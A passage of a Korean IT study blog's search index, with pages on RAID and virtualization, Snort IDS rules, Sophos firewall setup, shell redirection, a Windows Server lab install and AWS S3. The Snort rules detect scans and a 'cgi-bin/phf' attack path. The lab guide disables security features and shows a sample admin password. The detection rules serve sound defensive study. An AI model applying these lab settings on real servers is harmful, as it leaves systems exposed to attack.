정의되며, 주로 아카이브의 장기 보존용도를 전제로 하루에 몇 시간 정도의 이용을 목적으로 한 하드디스크로 NL-SATA, NL-SAS의 두 종류로 되어있습니다.       SSD(Solid State Drive)\n 반도체 소자 메모리를 기억 장치에 이용한 디스크로 빠르고 저전력으로 동작하지만 일반적인 하드디스크보다 용량 단가가 비싸며, SSD에는 쓰기와 지우기를 반복하면 소자가 열화되어 성능이 떨어진다는 단점이 있습니다.    SSD에는 SLC(Single Level Cell)과 MLC(Multi Level Cell가 존재하며, SLC는 기억 소자 하나에 1bit 데이터를 기록하지만 MLC는 기억 소자 하나에 2bit 데이터를 기억하므로 대용량으로 만들 기 쉽다는 장점이 있습니다.\n  위와 같은 차이로 인해 SLC는 쓰기 속도가 빠르고 다시 쓰기 가능 횟수가 많지만, MLC는 쓰기 속도가 느리고 다시 쓰기 가능횟수가 적다는 특징이 있으며 가격은 SLC에 비해 MLC가 상대적으로 점려하여 주로 사용됩니다.\n     엔터프라지으 플래시 메모리 스토리지\n 엔터프라이즈 용도로 비휘발성 메모리(NAND 플래시 메모리)가 사용된 초고속 저장 장치로 SSD, SATA 인터페이스 등으로 연결하지만 엔터프라이즈 플래시 메모리 스토리지는 PCI Express 인터페이스 연결하는 것이 많습니다.       RAID   RAID는 여러 디스크를 논리적으로 결합 및 분배하여 성능과 내장애성을 높이는 기술입니다.   RAID 레벨   기본적으로 RAID 레벨은 0, 1, 2, 3, 4, 5, 6으로 일곱 가지가 존재하며 또한 RAID0와 다른 RAID 레벨을 조합한 RAID10(1+0), RAID50(5+0), RAID60(6+0)으로 활용되어집니다.    RAID 레벨 표     RAID 설명 용도     0 내장애성이 없는 디스크 어레이(스트라이핑) 디스크 I/O 성능을 높여야 할 때 사용되며 내장애성이 낮고, 주로 로그 집계 등의 임시 저장 영역에 사용   1 이중화(미러링) 내장애성이 높으며, 운영체제가 설치된 파티션 등에 사용   2 비트 단위 전용 오류 보정 부호 드라이브 거의 사용되지 않음   3 비트/바이트 단위 전용 패러티 드라이브 거의 사용되지 않음   4 블록 단위 전용 패러티 드라이브 거의 사용되지 않음   5 블록 단위 전용 패러티 정보기록 저장 용량을 넉넉하게 확보하고자 할 때 사용하며, 주로 파일서버나 로그 저장에 사용   6 블록 단위에서 두 가지 패러티 정보기록 RAID5와 용도는 같지만 RAID5보다 내장애성이 높음   10 RAID1을 스트라이핑 내장애성과 디스크 I/O성능을 모두 만족해야 할 때 사용하며, 주로 데이터베이스 등에 사용   50 RAID5를 스트라이핑 저장 용량확보와 디스크 I/O 성능을 모두 만족해야할 때 사용되며 주로 파일 서바나 로그 저장에 사용   60 RAID6를 스트라이핑 저장 용량확보와 디스크 I/O 성능을 모두 만족해야할 때 사용되며 주로 파일 서바나 로그 저장에 사용       500GB 디스크를 12개 사용할 때의 실제 용량     RAID 계산식 실제 용량     0 500GB X 12개 6TB   1 구성 불가능, RAID 10으로 구성 X   5 500GB X (12-1)개 5.5TB   6 500GB X (12-2)개 5TB   10 500GB X (12/2)개 3TB   50 500GB X ((3-1)X4)개 4TB   50 500GB X ((4-1)X3)개 4.5TB   50 500GB X ((6-1)X2)개 5TB      RAID 성능    RAID를 구성하면 디스크의 I/O 성능을 높일 수 있으며, 디스크 I/O 성능이란 서버와 스토리지 사이에 주고받는 데이터의 읽기 쓰기 성능을 가리키고, 특히 1초당 처리할 I/O 수치를 IOPS(Input/Output Per Second)라 합니다.\n  디스크 하나를 사용할 때보다 두 개를 병렬로 사용할 때 이론상 두 배 빠른 디스크를 읽고 쓸 수 있게 되며, 이론상으로 8개를 사용하면 여덟 배의 속도를 가지게 되고 이와 같은 디스크 수를 스트라이핑 개수라 합니다.\n     RAID5와 RAID10\n  디스크 용량이 대량으로 필요할 때는 RAID5나 RAID10가 주로 사용됩니다.\n  일반적으로 RAID5는 실제 용량을 많이 확보할 수 있는 대신 속도가 느리고, RAID10은 실제 용량이 줄어드는 대신 속도가 빠른 장점을 가지고 있습니다.\n       RAID5와 RAID6\n RAID5는 패리티 정보의 한 종류만 이용하지만, RAID6는 패러티 정보를 두 종류 이용하므로 보통은 RAID6 쪽이 우수하다고 하나, 문제 발생시 복구가 가능한 정도와 속도면에서는 RAID5가 우수합니다.       가상화    한 대의 물리 서버는 보통 하나의 운영체제만 가동이 가능하지만, 가상화 기술을 사용하면 여러 게스트 운영체제를 가동할 수 있습니다. 우리는 이를 서버 가상화라 칭합니다.\n  가상의 환경에서는 물리 서버가 제공하는 CPU, 메모리, 네트워크, 디스크 등의 하드웨어 자원을 각 게스트 운영체제에 자유롭게 할당하며, 여러 운영체제마다 물리서버를 준비하는 것과 비교했을 때, 한 물리 서버의 하드웨어 자원을 최대한 활용할 수 있는 가상화를 잘 이용하면 리소스의 낭비를 줄일 수 있습니다.\n   물리 서버와 가상 서버의 특징    물리 서버\n CPU 사용률가 디스크 I/O부하, 디스크 사용 용량이 많은 용도에 적합하며, 주된 용도는 데이터베이스 서버, 애플리케이션 서버 등이 있음       가상 서버\n CPU 사용률가 디스크 I/O부하, 디스크 사용 용량이 적은 용도에 적합하며, 가상서버의 주된 용도는 웹 서버, 개발 서버, 메모리 DB 등이 있음       가상화의 장, 단점\n 장점   비용을 줄일 수 있음\n  게스트 운영체제의 하드웨어 자원을 쉽게 늘리거나 줄일 수 있음\n  물리 서버는 하드웨어가 노후화되므로 일정 기간이 지나면 하드웨어를 교체해야 하지만, 게스트 운영체제는 다른 물리 서버에 가상화 환경을 준비한 다음 마이그레이션이 가능\n      단점   다른 게스트 운영체제가 하드웨어 자원을 많이 사용하면, 타 게스트 운영체제의 동작이 불안정해질 수 있음\n  한 번 만들어진 게스트 운영체제는 이후에 사용하지 않아도 삭제되지 않고 그대로 남을 수 있음\n         가상화 모델    가상화를 구현하기 위해서는 하드웨어 자원 및 게스트 운영체제를 관리하는 프로그램이 필요합니다.\n  윈도우와 리눅스 같은 일반 웅영체제에 게스트 운영체제를 관리하는 프로그램을 설치해서 가상화 하는 방식을 호스트 운영체제 타입이라 하며, 호스트 운영체제상에서 다른 애플리케이션처럼 가상화 환경을 다룰 수 있어 손쉽게 구현이 가능하지만, 운영체제의 중간에 두는 만큼 동작에 오버헤드가 생겨 동작 속도가 떨어질 수 있습니다.\n  호스트 운영체제 대신 가상화 전용운영체제를 사용하는 방식을 하이퍼바이저 타입이라고 하며, 호스트 운영체제 타입처럼 중간에 개입하는 운영체제가 없으므로 빠른 동작 및 속도를 기대할 수 있습니다.\n  개인이 사용하는 PC에서 가상화를 구현할 때는 비교적 호스트 운영체제 타입을 채용하는 경우가 많지만, 서버 용도로 사용할 때는 하이퍼바이저 타입을 채용하는 경우가 많습니다.\n  가상화 모델 비교\n      가상화 환경의 종류   서버 가상화를 실현하는 다양한 방식이 있습니다.    상용 소프트웨어   Vmware vSphere\n  Hyper-V\n      오픈 소스   Xen(Linux Foundation)\n  KVM\n       Clooud Computing    클라우드 컴퓨팅(퍼블릭 클라우드)를 사용하면 보다 선택의 폭이 넓어질 수 있습니다.\n  저장소의 이중화를 퍼블릭 클라우드를 사용한 하이브리드 아키텍처를 설계하거나, 혹은 특정 운영체제를 퍼블릭에서 구현하는 등을 선택할 수 있습니다.\n  클라우드 컴퓨팅의 대한 자세한 설명은 클라우드 컴퓨팅을 참조해주세요.\n      회계 상의 클라우드       물리서버(자사구입) 물리서버(리스) 클라우드(IaaS)     자산 자사 자산 리스 회사 자산 클라우드 벤더 자산   캐시 플로우 구입 시 일괄 지급 매월 일정액 지불 매월 일정액 지불   회계상 비용 감가상각 비용 처리 비용 처리   회게 처리상 장점 고정비용 모두 비용으로 처리 가능 및 감가상각 관리 불필요 모두 비용으로 처리 가능 및 감가상각 관리 불필요   회계 처리상 단점 구매 시에 모든 비용을 결제하며, 비용 처리가 불가능 중도 해약이 불가능 회게 처리시 약간의 전문성이 필요(종량제 요금의 특징)   이용 정지 후의 비용 감가상각 기간이 끝날 때까지 비용이 발생 계약 기간이 끝날 때까지 비용이 발생 계약 종료 이후에는 비용이 발생하지 않음   비고  심사에 통과하지 않으면 게약이 불가능       "}),a.add({id:63,href:'/docs/network/snort/snort-02/',title:"Snort 역할",content:"시스템통합 관리 침입 탐지 시스템(IDS) \u0026ndash; Snort 이용    주된 기능\n  탐지(Detection)\n  잘못된 패킷을 감지하면 사용자에게 알림(주체적으로 처리하지 X, only 안내)\n       탐지 종류 2가지\n  (1)오용 탐지	알고 있는 것 탐지\n  (2)이상 탐지	모르는 것도 탐지(100% 탐지 X)\n  너무 민감하게 처리하면 필요한 정보도 차단하는 실수를 할 수 있음\n       설치위치 ( 성능이 달라짐 )\n  패킷이 라우터로 들어오기 전\n  내부 네트워크로 들어오는 모든 패킷은 IDS를 거침\n  쓸 데 없는 패킷을 많이 훑기 때문에 효율적이지 X\n (일반적으로 정상적인 패킷이 더 많기 때문)      라우터 뒤\n  라우터의 패킷 필터링을 거친 패킷을 검사\n  라우터 전보다는 성능저하 덜 함\n  but, 공격 패킷 탐지는 낮아질 수 있음\n    방화벽 뒤\n 일반적으로 2, 3, 4계층 패킷을 거름(5, 6, 7계층도 거름)    내부 네트워크\n  내부의 클라이언트를 신뢰할 수 없어 내부 네트워크 해킹을 감시하려 할 때 설치\n  내부 네트워크에 대한 해킹 피해를 방지하기 위해\n      Snort 설치 \rSnort 설치\r...\r\r 의존성 관련 프로그램 설치   - yum -y install http://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/d/daq-2.0.6-1.el7.x86_64.rpm\r- yum -y install gcc gcc-c++ flex bison zlib libpcap pcre libdnet tcpdump\r- yum -y install ftp://ftp.pbone.net/mirror/archive.fedoraproject.org/epel/7/x86_64/Packages/l/libnghttp2-1.31.1-1.el7.x86_64.rpm\rmkdir /[ doc ]\rcd /[ doc ]\r   wget http://ftp.psu.ac.th/pub/snort/libdnet-1.12.tgz\n  tar zxvf libdnet-1.12.tgz\n  cd libdnet-1.12\n  ./configure\n  make\n  make install\n               스노트 설치     Snort 다운로드\n  wget https://www.snort.org/downloads/snort/snort-2.9.16-1.centos7.x86_64.rpm\n  rpm -ivh snort\u0026hellip;.\n     스노트 기본 설정   /etc/snort/snort.conf 파일에서 기존의 룰 제거\n  253번 줄 맨 앞에 # 추가\n dynamicdetection directory /usr/local/lib/snort_dynamicrules \u0026ndash;\u0026gt; # dynamicdetection directory /usr/local/lib/snort_dynamicrules    511번, 512번 줄 맨 앞에 # 추가\n whitelist $WHITE_LIST_PATH/white_list.rules, \\ \u0026ndash;\u0026gt; # whitelist $WHITE_LIST_PATH/white_list.rules, \\ blacklist $BLACK_LIST_PATH/black_list.rules \u0026ndash;\u0026gt; # blacklist $BLACK_LIST_PATH/black_list.rules    548번, 651번 줄까지 맨 앞에 # 추가 or 삭제\n include \u0026hellip;\u0026hellip; \u0026ndash;\u0026gt; # include      cd /etc/snort/rules\n vi local.rules  alert icmp any any -\u0026gt; any any ( msg:\u0026ldquo;ICMP Detected\u0026rdquo;; sid:1000001; ) [액션][프로토콜][출발지IP][출발지포트]	[목적지IP][목적지포트]	[옵션]     snort 실행\n snort -c /etc/snort/snort.conf -i ens33    snort 실행확인\n  tail -f /var/log/snort/alert\n  *tip : snort.log로 시작하는 파일은 문서 파일이 아닌 실행 파일\n  snort 종료하면 나오는 보고서 형식으로 작성됨\n  snort -r 옵션으로 해당 파일을 볼 수 있음\n        \r\r\r Snort rules  \rSnort rules\r...\r\rRule  Rule 형태 : [RuleHeader] [tcp, udp, icmp, ip] [출발지IP] [포트] [-\u0026gt;, \u0026lt;\u0026gt;] [도착지IP] [포트] [RuleOption] - ex)alert icmp any any -\u0026gt; any any ( msg:\u0026quot;ICMP Detected\u0026quot;; sid:1000001; )\r Rule Header    Rule Action\n  alert : 룰에 일치하는 경우 경고를 발생 시키고 로그로 기록한다.\n  log : 로그로 기록한다.\n  pass : 패킷을 무시한다.\n  drop : 패킷을 차단하고 로그로 남긴다.\n  reject : 패킷을 차단하고 로그로 남긴다, 그리고 tcp 패킷의 경우 rst 패킷을 응답하고 udp 패킷의 경우 icmp unreachable 패킷으로 응답한다.\n  sdrop : 패킷을 차단하고 로그를 남기지 않는다.\n      프로토콜\n TCP, UDP, ICMP, IP      IP 주소\n  any는 모든 IP\n  논리부정연산자(!) 사용 가능\n  여러 IP주소에 대한 표기 [] 사용, 콤마(,)로 구분\n ex) !192.168.1.0/24 ![192.168.1.0/24,10.1.1.0/24]      포트 번호\n  1:1024 = 1 ~ 1024\n  :1024 = 1024 port 이하\n  1024: = 1024 port 이상\n  !1:1024 = 1 ~ 1024 port를 제외한 나머지\n    패킷 방향\n -\u0026gt; outgoing 패킷 \u0026lt;- 존재하지 않는다 \u0026lt;\u0026gt; 양방향    Rule Option    Rule Option은 새미콜론(;)으로 구분한다.\n  general : 룰에 대한 정보를 포함하는 옵션\n  msg : alert 엔진을 통해 전달하는 메시지를 설정할 수 있다.\n ex) msg:\u0026quot;\u0026quot;;    sid : Snort ID의 약자로 룰을 식별하기 위해 사용된다.\n ex)sid:;    payload : 패킷 내 페이로드 내부의 데이터를 찾고 상호작용을 할 수 있는 옵션\n  content : 페이로드 내 존재하는 특정 문자열이나 헥스 값 등을 판별하여 룰에 영향을 줄 수 있다. 사실상 가장 많이 쓰일 것 같다. 헥스 값의 경우 ‘|’ 으로 감싸주어 사용 가능하다.\n ex)content :[!]\u0026quot;\u0026quot;;    depth : 지정된 패턴을 검색 시 패킷의 길이를 지정할 수 있다. depth가 5인 경우 페이로드의 처음 5바이트 내에서 지정된 패턴을 찾는다. offset 키워드와 함께 사용 가능하다.\n  offset : depth와 비슷하며 함께 자주 쓰인다. 말 그대로 해당 오프셋부터 패턴을 검색한다. offset이 5인 경우 offset 5부터 지정된 패턴을 검색한다.\n ex) alert tcp any any -\u0026gt; any 80 (content:\u0026ldquo;cgi-bin/phf\u0026rdquo;; offset:4; depth:20;) 80(http/tcp)로 접근하는 모든 패킷의 offset 4부터 20바이트 내 cgi-bin/phf 문자열이 존재하는지 확인한다.    non-payload : 페이로드가 없는 데이터에서 사용\n  fragoffset : IP Fragment 오프셋 필드의 값을 비교할 수 있다.\n ex)fragoffset:[!]\u0026lt;|\u0026gt;];    ttl : TTL(Time To Live) 항목이다. traceroute 명령어를 탐지하기 위한 키워드이다.\n ex)ttl:[\u0026lt;,\u0026gt;,=,\u0026lt;=,\u0026gt;=]; , ttl:[]-[\u0026lt;number];    fragbits : 단편화된 패킷이거나 IP Header 내 flags 필드에 비트가 설정되어 있는지 확인하는데 사용된다.\n ex)fragbits:MD+; More Fragments bit \u0026amp; Don’t Fragments bit    flags : TCP flag 비트를 확인하는데 사용한다. 기본적으로 UAPRSF(URG, ACK, PSH, RST, SYN, FIN)를 확인할 수 있고, 추가적으로 CWR, ECE 를 사용할 수 있다.\n  ex) alert tcp any any -\u0026gt; any any (flags:SF;) 모든 패킷에 SYN과 FIN 패킷을 탐지한다.\n  탐지 가능한 공격 : X-Mas 스캔, Null 스캔\n X-Max 스캔  alert tcp any any -\u0026gt; any any (mag:\u0026#34;X-Max Scan Detected!!\u0026#34;; flags:FPU; sid:1000004;) \r- Null 스캔\r```python\ralert tcp any any -\u0026gt; any any (mag:\u0026quot;Null Scan Detected!!\u0026quot;; flags:0; sid:1000005;)\r\r    threshold 옵션 : 행위기반 탐지가 가능한 옵션\n track by_src : 동일한 출발지에서 track by_dst : 동일한 목적지로  threshold:type threshold, limit, both # 패킷량, 임계시간 임계시간 단위당 로그 발생량  - count : 수\r- seconds : 초\r  seq : TCP sequence number를 확인한다.\n ex) seq:0;    ack : TCP acknowledge number를 확인한다.\n ex) ack:0;    Post-detection : 사후탐지에 대한 옵션, 룰 실행 후의 규칙\n  react : 패킷을 차단하거나 경고 메시지를 출력한다.\n react:block; : 패킷을 차단한다    ARP 탐지 추가\n vi /etc/snort/snort.conf ARP spoot 수정 preprocessor arpspoof_detect_host: [ IP 주소 ] [ MAC 주소 ]    preprocessos : snort.conf 파일에 설정하는 전처리 기능\n  itype : ICMP Type 지정\n  icode : ICMP Type의 Code 지정\n  ICMP Redirect 탐지, ICMP 요청만 탐지\n      \r\r\r    스노트 실습 \r스노트 실습\r...\r\r 실습 환경 구성     스노트 실습  \r\r\r ~ ~\n"}),a.add({id:64,href:'/docs/network/sophos/sophos_2/',title:"Sophos 방화벽 구축",content:"Sophos 방화벽 구축    구성환경    저번 장에 이어 이번에는 10.10.10.0/24 서버를 한 개 추가하여 방화벽을 구축해보도록 하겠습니다. 먼저, 위의 그림과 같이 환경을 세팅합니다. ( Sophos에 대역 추가 )     Network Interfaces 추가    방화벽을 구성하기 전에 먼저, Network Interfaces를 설정하겠습니다.    Sophos에 로그인을 완료하면, 대역이 추가됬음을 확인할 수 있습니다. 하지만 아직 인식만 될 뿐, 되지 않아 추가 설정이 필요합니다.      먼저 좌측 메뉴에서 Interfaces \u0026amp; Routing \u0026gt; Interfaces 를 클릭합니다. 그 후, 인터페이스들이 나열되면 New Interface를 클릭하여 Interface를 추가 및 설성즐 완료합니다. 여기서는 10.10.10.0/24 대역에 10.10.10.3 IP를 가지게 세팅하였습니다.      설정이 완료되면 추가한 인터페이스를 Enable 시켜주시면 정상적으로 Server에서 Sophos로 ping이 통하는 것을 확인할 수 있습니다.                                                                     "}),a.add({id:65,href:'/docs/infra/tia-942/',title:"TIA-942",content:"TIA-942    TIA-942\n  \n  \n  \n  \n  \n  \n  \n  \n  \n      "}),a.add({id:66,href:'/docs/development/shell/shell-2/',title:"UNIX/ Linux 개념과 명령어",content:"Shell Programming  UNIX/ Linux 기본 명령어와 개념  Redirection \u0026amp; Pipes  $ \u0026lt;File Descriptor\u0026gt; \u0026lt;PATH\u0026gt; \u0026lt;Redirection\u0026gt; $ \u0026lt;File Descriptor\u0026gt; \u0026lt;PATH\u0026gt; \u0026lt;Redirection\u0026gt; \u0026lt;Pipe\u0026gt; \u0026lt;File Descriptor\u0026gt; ... ex) $ cat /log/var/message | grep ERR # cat = \u0026lt;File Descripotr\u0026gt; # /log/var/message = \u0026lt;PATH\u0026gt; # | = \u0026lt;Redirection\u0026gt;   File Descriptor   Process가 File이나 Device를 access 하기 위해 사용\n  Standard File Descriptor\n  stdin(standard input) : 표준 입력 (예시 : 키보드)\n  stdout(standard output) : 표준 출력 (예시 : 모니터)\n  stderr(standard error) : 표준 에러 출력 (예시 : 에러 메시지)\n       PATH   파일의 경로\n  절대경로 및 상대경로로 구분\n       Redirction   출력 재지정\n  입력 재지정\n  \u0026gt;, \u0026raquo; (stdout을 파일로 저장 또는 추가)\n  \u0026lt; (파일을 stdin으로 전달)\n       Pipe (|)   앞의 명령어의 샐행 결과가 뒤의 명령어에 입력되도록 입출력을 연결하는 역할을 수행\n  Process 연결 (stdout을 stdin으로 전달)\n  Process 간의 데이터 흐름은 자동으로 조절되어짐\n       예시  $ ls -al \u0026gt; lsoutput.txt # ls -al의 출력을 lsoutput.txt에 입력 # ls -al = stdout # \u0026gt; = Redirction # lsoutput.txt = PATH \u0026amp; stdin $ cat lsoutput.txt drwxr-xr-x 2 root root 4096 Aug 23 06:49 . drwx------ 6 root root 4096 Aug 23 06:49 .. -rw-r--r-- 1 root root 0 Aug 23 06:49 lsoutput.txt # lsoutput.txt의 내용을 출력 # cat = stdout # lsoutput.txt = PATH $ more \u0026lt; lsoutput.txt drwxr-xr-x 2 root root 4096 Aug 23 06:49 . drwx------ 6 root root 4096 Aug 23 06:49 .. -rw-r--r-- 1 root root 0 Aug 23 06:49 lsoutput.txt # lsoutput.txt의 내용을 more의 출력 # more = stdout # \u0026lt; = Redirction # lsoutput.txt = PATH $ ps \u0026gt;\u0026gt; lsoutput.txt $ cat lsoutput.txt drwxr-xr-x 2 root root 4096 Aug 23 06:49 . drwx------ 6 root root 4096 Aug 23 06:49 .. -rw-r--r-- 1 root root 0 Aug 23 06:49 lsoutput.txt PID TTY TIME CMD 1531 pts/0 00:00:00 sudo 1538 pts/0 00:00:00 su 1539 pts/0 00:00:00 bash 2195 pts/0 00:00:00 ps # ps의 출력 내용을 lsoutput.txt의 이어 쓰기 # ps = stdout # \u0026gt;\u0026gt; = Redirction # lsoutput.txt = PATH \u0026amp; stdin $ ps \u0026gt; lsoutput.txt $ cat \u0026gt; lsoutput.txt PID TTY TIME CMD 1531 pts/0 00:00:00 sudo 1538 pts/0 00:00:00 su 1539 pts/0 00:00:00 bash 2195 pts/0 00:00:00 ps # 여기서 \u0026gt; 는 덮어쓰기 \u0026gt;\u0026gt; 는 이어쓰기를 의미 # ps = stdout # \u0026gt; = Redirction # lsoutput.txt = PATH \u0026amp; stdin    Shell Programming의 방법   Shell Programming을 사용하기 위해서는 두 가지 방법이 존재   Line command $ for file in * \u0026gt; do \u0026gt; if grep -l ps $file \u0026gt; then \u0026gt; more $file \u0026gt; fi \u0026gt; done lsoutput.txt PID TTY TIME CMD 1531 pts/0 00:00:00 sudo 1538 pts/0 00:00:00 su 1539 pts/0 00:00:00 bash 2335 pts/0 00:00:00 ps  Line command는 CLI환경에서 특정 파일을 통해서가 아닌 직접 함수와 변수를 코딩함으로서 Programming을 수행하는 방법    Script $ vi Script.sh # !/bin/bash for file in * do if grep -l ps $file then echo $file fi done exit 0 $ chmod 700 ./Script.sh $ ./Script.sh lsoutput.txt PID TTY TIME CMD 1531 pts/0 00:00:00 sudo 1538 pts/0 00:00:00 su 1539 pts/0 00:00:00 bash 2335 pts/0 00:00:00 ps  Script는 특정 파일 내부에 함수와 변수의 코드함으로서 이를 실행시켜 Programing을 수행하는 방법    "}),a.add({id:67,href:'/docs/system/window/window02/',title:"Windows Server Install",content:"Windows Server Install   설치순서   Windows Server 2016 ISO 다운로드 및 인스톨\n  관리자 비밀번호지정\n  평가기간 라이선스 확인\n  한글 언어팩 설치\n  VMware Tools 설치\n  네트워크 고정IP주소로 설정\n  컴퓨터 이름 변경\n  디스플에이 끄기 시간 조절\n  Internet Explorer 보안 설정 끄기\n  Administrator 암호 기간 제한 제거\n  자동 업데이트 기능 끄기\n  종료 후 설정 완료된 가상머신을 스냅샷\n     Windows Server 2016 Install   이미지를 삽입 후에 시간을 Korea로 설정 후 설치를 진행합니다.       설치를 진행합니다.       서버 및 클라이언트를 모두 사용할 것이기 때문에 최하단를 선택합니다.       업데이트 및 특정 세팅이 필요하지 않기 때문에 커스텀을 선택합니다.       사전에 생성된 디스크를 선택하여 설치를 진행합니다.        설치가 완료되면 자동으로 재부팅 후, admin의 패스워드를 지정해야합니다.\n  초기 qwer1234로 했다 보안레벨에 걸려 Dkagh1234.로 진행하였습니다.\n       설정이 완료되면 익숙한 화면이 보이며 Ctrl + Alt + Delete를 클릭하여 로그인화면으로 이동합니다.       위에서 설정한 암호로 접속을 진행합니다.       초기 진입시 네트워크 관련 설정이 나오며 Yes를 선택합니다.       실행시 자동으로 서버 매니저가 실행되며, 이를 비활성화하기 위해 Manage \u0026gt; Server Manage Properties를 클릭합니다.       로그인시 자동실행안함을 설정합니다.       다음으로는 언어설정을 위해 제어판으로 진입합니다.       Add a language를 선택합니다.       한국어의 우측 Options을 클릭합니다.       언어팩을 다운로드합니다.       언어팩의 설치가 완료된 후, 로그아웃 및 재진입시 언어가 바뀐 것을 확인할 수 있습니다.       언어설정이 끝났으면 VMware Tools을 설정합니다. (안하셔도 상관없습니다)       만약 자동적으로 설치가 안될시, 내컴퓨터에 진입하여 직접설치합니다.        다음으로는 네트워크 설정을 위해 제어판 \u0026gt; 네트워크 상태 및 작업 보기를 선택합니다.\n  WINCLIENT는 네트워크 설정을 제외합니다. (DHCP 자동설정)\n       Ethernet0을 선택합니다.       Ethernet의 속성에서 IPv4를 선택 후, 네트워크 토폴로지에 맞게 네트워크를 설정합니다.       cmd창에서 ipconfig를 통해 네트워크가 변경된 것을 확인할 수 있습니다.       compute의 이름을 변경하기 위해 시스템을 클릭합니다.       설정변경을 클릭하고 컴퓨터의 이름을 변경합니다.       다음으로는 모니터의 자동꺼지을 방지하기 위해 제어판에서 하드웨어를 선택합니다.       전원 옵션을 선택합니다.       설정을 변경합니다.       다음으로는 보안설정을 변경하기 위해 서버관리자를 선택합니다. 실습에서만 보안설정을 없애며 본업무에서는 절대로 없애서는 안됩니다       로컬서버에서 IE 보안 강화 구성을 설정합니다.       다음으로는 닷넷을 사용하기위해 플그램 및 기능 \u0026gt; Windows 기능 켜기/끄기를 선택합니다.       기본설정으로 진행하지만, 기능에서 NET Framwork 3.5는 반드시 설치하셔야합니다.        설치가 완료되었습니다.       다음으로 윈도우 업데이트를 연기하기 위해 서버 매니저 \u0026gt; 로컬 서버 \u0026gt; 윈도우 업데이트를 설정합니다.         윈도우 업데이트를 중지하기 위해 Services를 실행합니다.       Windows Update를 중지하도록 설정합니다.        설정이 끝났으면 스냅샷을 저장합니다.      WINCLIENT 설정    WINCLIENT는 다른 서버들과 동일하게 설정을 진행하나, 기본적으로 WIN10과 비슷하게 동작하도록 DHCP 설정 및 다른 설정을 추가해야합니다.\n  먼저, 네트워크 설정은 하지않고 그대로 둔 후, 다른 설정들을 모두 진행합니다.\n       ctrl + F 찾기에서 gpedit.msc를 실행합니다.\n  설치 중에 설정한 것이라 하단은 신경쓰지 않으셔도 됩니다.\n       그룹 정책 에디터가 나오면 하단의 그림과 같이 로그인 시 CTRL + ALT + DEL를 눌러도 되지 않도록 설정합니다.       동일하게 종료시에도 다시 묻지않도록 설정을 진행합니다.       다음에는 실행에서 control userpasswords2를 입력하여 어드민 계정을 수정합니다.       패스워드를 입력해도 사용하지 않도록 설정합니다.       설정 후 재부팅을 진행하면 하단과 같이 단축키를 누르라는 각종 설정에 사라진 것을 확인할 수 있습니다.       이 후 스냅샷을 저장하고 나면 준비가 완료되었습니다.     SERVERCORE 설치    SERVERCORE는 기본적으로 GUI환경을 설칭않도록 진행하겠습니다.\n  다른 것들을 동일하나 설치환경을 스텐다드를 선택하여 설치를 진행합니다.\n       설치가 완료되면 GUI환경과 동일하게 admin의 암호를 설정합니다.       설정이 오나료되면 다음과 같이 cmd 화면이 나타납니다.        먼저 나중에 사용하기 위해 종료를 진행합니다.\n  SERVERCORE 또한 스냅샷을 저장합니다.\n  $ shutdown /s /t 0     이상으로 Windows Server 설치를 마치고 본격적인 실습에 들어가도록 하겠습니다.    "}),a.add({id:68,href:'/docs/aws/awssaa/saa-3/',title:"3장 S3와 Glacier",content:"3장 Amazon Simple Storage Service와 Amazon Glacier Storage Service   3장의 목표   복원력을 갖춘 아키텍처 설계\n 안정적이고/ 복원력을 갖춘 스로티리지를 선택한다. 어떻게 멀티 티어 아키텍처 솔루션을 설계할지 결정한다. 어떻게 고가용성 및 내결함성을 갖춘 아키텍처를 설계할지 결정한다.    성능이 뛰어난 아키텍처 정의\n 성능이 뛰어난 스토리지 및 데이터베이스를 선택한다. 탄력성과 확장성을 갖춘 솔루션을 설계한다.    안전한 애플리케이션 및 아키텍처 설명\n 어떻게 애플리케이션 티어를 보호할지 결정한다. 어떻게 데이터를 보호할지 결정한다.    비용에 최적화된 아키텍처 설게\n 어떻게 비용에 최적화된 스토리지를 설계할지 결정한다.       Amazon simple Storage Service ( 이하 S3 )    S3는 개인 애플리케이션, 다수 AWS 서비스의 데이터를 보관하며,다음 워크로드를 위한 훌륭한 플랫폼이다.\n  S3의 주요기능\n 백업 아카이브 로그 파일, 재해 복구 이미지 유지 관리 분석을 위한 데이터 저장 정적 웹 사이트 호스팅       S3는 객체 스토리지로, 전 장에서 배운 EC2는 인스턴스를 구동하는 반면 S3는 무제한 객체 스토리지 공간을 효과적으로 제공한다.\n  객체 스토리지와 블록 스토리지의 차이점\n     Type 차이점 예시     블록 스토리지 물리적 디스크를 개별 블록으로 나눠 데이터를 저장하고 파일 시스템으로 관리 Window NTFS, Linux Btrfs, ext 등   객체 스토리지 구조화되지 않은 평면의 저장소에 데이터를 저장하여 무제한의 스토리지를 구현가능 S3, swift 등     S3에 파일을 쓸 때는 2KB 메타 데이터가 함께 저장되며, 이 메타 데이터는 세부 정보를 구성하는 키로 만들어지며, 데이터 사용 권한과 파일 시스템처럼 보여지는 중첩 버킷 내 위치 정보 등이 저장된다.     S3 서비스 아키텍처    S3 파일은 버킷으로 구성되며, AWS 계정당 기본으로 만들 수 있는 버킷은 100개이다.\n  버킷 또한 할당량에 초과사용을 요청할 수 있다.\n  S3 버킷은과 내용은 한 AWS 리전에만 존재하며, 버킷의 주소는 S3 글로벌 시스템 내에서 유일해야한다. ( 증복이 허용되지 않음 )\n  이는 버킷에 보다 쉽게 접속하기 위해 규칙을 정해놓은 것이다.\n  $ https://[ bucketname ].s3.[ region code ].amazon.com/[ filepath ] # 엑세스를 위한 URL $ s3://[ bucketname ]/[ filepath ] # CLI 환경에서의 엑세스   이론적으로 버킷에는 무한정의 대이터를 저장할 수 있지만, 단일 객체의 크기는 5TB를 넘을 수 없고, 한 번에 용량에 업로드할 수 있는 용량 크기는 최대 5GB이다.\n  100MB보다 큰 객체를 업로드시에는 멀티 파트 업로드를 사용해서 데이터의 손실 및 업로드가 중지되는 위험을 줄일 수 있다.\n 멀티 파워 업로드 : 데이터를 나눠서 업로드 하는 방식 ( ex : 분할 압축 )    단, 상위 수준의 API에서는 멀티 파트 업로드가 자동이지만, 하위 수준에서는 수동으로 나눠야 한다.\n     암호화    웹 사이트와 같이 퍼블릭에서 엑세스하는 용도가 아니라면, S3에 저장할 데이터는 항상 암호화해야 한다.\n  S3에 저장 중인 데이터를 보호하기 위해서 암호화 키를 사용할 수도 있고, S3에서 다른 위치로 전송하는 데이터를 보호하기 위해서 Amazon 암호화 API 엔드포인트 만을 사용할 수 있다.\n  저장 중 데이터는 서버 측 암호화 혹은 클라이언트 측 암호화를 사용해서 보호할 수 있다.\n    서버 측 암호화  서버 측의 암오화는 S3 